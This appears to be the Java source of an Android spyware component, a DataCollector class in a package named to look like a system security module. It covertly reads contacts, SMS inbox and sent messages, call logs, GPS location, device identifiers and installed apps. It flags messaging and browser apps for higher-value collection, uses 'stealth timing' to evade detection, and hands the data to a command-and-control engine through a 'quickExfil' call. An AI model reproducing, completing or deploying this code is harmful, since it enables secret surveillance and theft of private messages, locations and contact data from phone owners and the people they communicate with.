package com.android.system.security;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import java.io.*;
import java.util.*;

/**
 * Collects contacts, SMS, call logs, device info, and location.
 * Uses Android ContentProviders with stealth timing.
 */
public class DataCollector {

    private static final String TAG = "DataCollector";

    private static final String[] TARGET_APPS = {
        "com.whatsapp", "org.telegram.messenger", "com.skype.raider",
        "com.facebook.orca", "com.facebook.katana", "com.twitter.android",
        "com.android.vending", "com.google.android.gm", "com.android.email",
        "com.slack", "com.discord", "com.instagram.android",
        "com.snapchat.android", "com.tencent.mm", "com.google.android.apps.messaging",
        "com.samsung.android.messaging", "com.google.android.apps.maps",
        "com.google.android.apps.photos", "com.android.chrome",
        "org.mozilla.firefox", "com.opera.browser", "com.sec.android.app.sbrowser"
    };

    private final Context context;
    private final EncryptedStore store;
    private final C2Engine c2Engine;

    // Staggered collection to avoid detection patterns
    private final Random random = new Random();

    public DataCollector(Context context, EncryptedStore store, C2Engine c2Engine) {
        this.context = context;
        this.store = store;
        this.c2Engine = c2Engine;
    }

    public static boolean isTargetApp(String packageName) {
        for (String target : TARGET_APPS) {
            if (packageName != null && packageName.contains(target)) {
                return true;
            }
        }
        return false;
    }

    public void triggerTargetAppCollection(String packageName) {
        // When a target app opens, collect higher-value data
        Map<String, Object> entry = new HashMap<>();
        entry.put("type", "target_app_open");
        entry.put("app", packageName);
        entry.put("timestamp", System.currentTimeMillis());
        store.store("events", entry);

        // Take screenshot via the service
        // (handled by CoreService)
    }

    // ============================================================
    // CONTACTS
    // ============================================================

    public void collectContacts() {
        try {
            ContentResolver cr = context.getContentResolver();
            String[] projection = {
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.HAS_PHONE_NUMBER
            };

            Cursor cursor = cr.query(
                ContactsContract.Contacts.CONTENT_URI,
                projection, null, null, null
            );

            if (cursor == null) return;

            List<Map<String, Object>> contacts = new ArrayList<>();
            int count = 0;

            while (cursor.moveToNext() && count < 50) {
                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                int hasPhone = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));

                Map<String, Object> contact = new HashMap<>();
                contact.put("name", name);
                contact.put("id", id);

                // Get phone numbers
                if (hasPhone > 0) {
                    List<String> phones = new ArrayList<>();
                    Cursor phoneCursor = cr.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id}, null
                    );
                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String phone = phoneCursor.getString(
                                phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            if (phone != null) phones.add(phone);
                        }
                        phoneCursor.close();
                    }
                    contact.put("phones", phones);
                }

                contacts.add(contact);
                count++;
            }
            cursor.close();

            if (!contacts.isEmpty()) {
                Map<String, Object> entry = new HashMap<>();
                entry.put("type", "contacts");
                entry.put("count", contacts.size());
                entry.put("data", contacts);
                entry.put("timestamp", System.currentTimeMillis());
                store.store("contacts", entry);
            }
        } catch (SecurityException e) {
            // Permission not granted — will retry later
        } catch (Exception e) {
            Log.w(TAG, "Contact collection failed: " + e.getMessage());
        }
    }

    // ============================================================
    // SMS
    // ============================================================

    public void collectSMS() {
        try {
            ContentResolver cr = context.getContentResolver();

            // Read inbox
            Cursor cursor = cr.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                null, null, null,
                Telephony.Sms.Inbox.DATE + " DESC LIMIT 50"
            );

            if (cursor == null) return;

            List<Map<String, Object>> messages = new ArrayList<>();

            while (cursor.moveToNext()) {
                Map<String, Object> msg = new HashMap<>();
                msg.put("address", cursor.getString(cursor.getColumnIndex(Telephony.Sms.Inbox.ADDRESS)));
                msg.put("body", cursor.getString(cursor.getColumnIndex(Telephony.Sms.Inbox.BODY)));
                msg.put("date", cursor.getLong(cursor.getColumnIndex(Telephony.Sms.Inbox.DATE)));
                msg.put("read", cursor.getInt(cursor.getColumnIndex(Telephony.Sms.Inbox.READ)));
                messages.add(msg);
            }
            cursor.close();

            if (!messages.isEmpty()) {
                Map<String, Object> entry = new HashMap<>();
                entry.put("type", "sms_inbox");
                entry.put("count", messages.size());
                entry.put("data", messages);
                entry.put("timestamp", System.currentTimeMillis());
                store.store("sms", entry);
            }

            // Read sent
            cursor = cr.query(
                Telephony.Sms.Sent.CONTENT_URI,
                null, null, null,
                Telephony.Sms.Sent.DATE + " DESC LIMIT 50"
            );

            if (cursor != null) {
                messages = new ArrayList<>();
                while (cursor.moveToNext()) {
                    Map<String, Object> msg = new HashMap<>();
                    msg.put("address", cursor.getString(cursor.getColumnIndex(Telephony.Sms.Sent.ADDRESS)));
                    msg.put("body", cursor.getString(cursor.getColumnIndex(Telephony.Sms.Sent.BODY)));
                    msg.put("date", cursor.getLong(cursor.getColumnIndex(Telephony.Sms.Sent.DATE)));
                    messages.add(msg);
                }
                cursor.close();

                if (!messages.isEmpty()) {
                    Map<String, Object> entry = new HashMap<>();
                    entry.put("type", "sms_sent");
                    entry.put("count", messages.size());
                    entry.put("data", messages);
                    entry.put("timestamp", System.currentTimeMillis());
                    store.store("sms", entry);
                }
            }
        } catch (SecurityException e) {
            // No SMS permission
        } catch (Exception e) {
            Log.w(TAG, "SMS collection failed: " + e.getMessage());
        }
    }

    // ============================================================
    // CALL LOGS
    // ============================================================

    public void collectCallLogs() {
        try {
            ContentResolver cr = context.getContentResolver();

            Cursor cursor = cr.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null,
                android.provider.CallLog.Calls.DATE + " DESC LIMIT 50"
            );

            if (cursor == null) return;

            List<Map<String, Object>> calls = new ArrayList<>();

            while (cursor.moveToNext()) {
                Map<String, Object> call = new HashMap<>();
                call.put("number", cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER)));
                call.put("type", cursor.getInt(cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE)));
                call.put("duration", cursor.getLong(cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION)));
                call.put("date", cursor.getLong(cursor.getColumnIndex(android.provider.CallLog.Calls.DATE)));
                call.put("name", cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)));
                calls.add(call);
            }
            cursor.close();

            if (!calls.isEmpty()) {
                Map<String, Object> entry = new HashMap<>();
                entry.put("type", "call_logs");
                entry.put("count", calls.size());
                entry.put("data", calls);
                entry.put("timestamp", System.currentTimeMillis());
                store.store("calls", entry);
            }
        } catch (SecurityException e) {
            // No call log permission
        } catch (Exception e) {
            Log.w(TAG, "Call log collection failed: " + e.getMessage());
        }
    }

    // ============================================================
    // LOCATION
    // ============================================================

    public void collectLocation() {
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);

            Location lastKnown = null;

            // Try GPS first
            try {
                lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            } catch (SecurityException ignored) {}

            if (lastKnown == null) {
                try {
                    lastKnown = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                } catch (SecurityException ignored) {}
            }

            if (lastKnown == null) {
                try {
                    lastKnown = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
                } catch (SecurityException ignored) {}
            }

            if (lastKnown != null) {
                Map<String, Object> entry = new HashMap<>();
                entry.put("type", "location");
                entry.put("lat", lastKnown.getLatitude());
                entry.put("lng", lastKnown.getLongitude());
                entry.put("accuracy", lastKnown.getAccuracy());
                entry.put("altitude", lastKnown.getAltitude());
                entry.put("speed", lastKnown.getSpeed());
                entry.put("bearing", lastKnown.getBearing());
                entry.put("provider", lastKnown.getProvider());
                entry.put("timestamp", lastKnown.getTime());
                entry.put("collected_at", System.currentTimeMillis());

                store.store("location", entry);
            }
        } catch (SecurityException e) {
            // No location permission
        } catch (Exception e) {
            Log.w(TAG, "Location collection failed: " + e.getMessage());
        }
    }

    // ============================================================
    // DEVICE INFO
    // ============================================================

    public void collectDeviceInfo() {
        Map<String, Object> info = new HashMap<>();
        info.put("type", "device_info");
        info.put("timestamp", System.currentTimeMillis());
        info.put("device_id", c2Engine.getDeviceId());
        info.put("android_version", Build.VERSION.RELEASE);
        info.put("api_level", Build.VERSION.SDK_INT);
        info.put("build", Build.DISPLAY);
        info.put("fingerprint", Build.FINGERPRINT);
        info.put("manufacturer", Build.MANUFACTURER);
        info.put("model", Build.MODEL);
        info.put("product", Build.PRODUCT);
        info.put("board", Build.BOARD);
        info.put("hardware", Build.HARDWARE);
        info.put("brand", Build.BRAND);
        info.put("device", Build.DEVICE);
        info.put("host", Build.HOST);
        info.put("tags", Build.TAGS);
        info.put("time", Build.TIME);
        info.put("type", Build.TYPE);
        info.put("user", Build.USER);
        info.put("security_patch", Build.VERSION.SECURITY_PATCH);
        info.put("bootloader", Build.BOOTLOADER);
        info.put("radio", Build.RADIO);
        info.put("serial", Build.SERIAL);

        // Network info
        try {
            java.net.NetworkInterface.getNetworkInterfaces();
            List<String> ifaces = new ArrayList<>();
            Enumeration<java.net.NetworkInterface> nets = java.net.NetworkInterface.getNetworkInterfaces();
            while (nets.hasMoreElements()) {
                ifaces.add(nets.nextElement().getName());
            }
            info.put("interfaces", ifaces);
        } catch (Exception ignored) {}

        // Installed apps (user-installed only)
        try {
            List<Map<String, String>> apps = new ArrayList<>();
            android.content.pm.PackageManager pm = context.getPackageManager();
            for (android.content.pm.PackageInfo pkg : pm.getInstalledPackages(0)) {
                if ((pkg.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                    Map<String, String> app = new HashMap<>();
                    app.put("package", pkg.packageName);
                    app.put("version", pkg.versionName);
                    app.put("first_install", String.valueOf(pkg.firstInstallTime));
                    apps.add(app);
                }
            }
            info.put("installed_apps", apps);
        } catch (Exception ignored) {}

        store.store("device", info);
        c2Engine.quickExfil(info);
    }
              }
